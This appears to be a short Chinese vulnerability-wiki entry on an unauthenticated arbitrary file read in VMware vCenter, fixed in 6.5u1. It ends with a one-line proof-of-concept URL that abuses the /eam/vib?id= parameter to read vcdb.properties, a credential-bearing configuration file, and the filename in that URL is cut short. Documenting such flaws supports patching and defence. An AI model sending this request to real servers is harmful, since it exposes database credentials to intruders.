# VMware vCenter未授权任意文件读取

### 原文链接

> https://twitter.com/ptswarm/status/1316016337550938122

在VMware vCenter中发现了一个未经身份验证的任意文件读取漏洞。VMware透露此漏洞已在6.5u1中修复，但未分配CVE

![img](/Users/aresx/Documents/VulWiki/Web%E5%AE%89%E5%85%A8/Vmware%20vCenter/.resource/VMware%20vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/640-20201014105633643.jpeg)



***\*POC\**:**

```
http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properti
```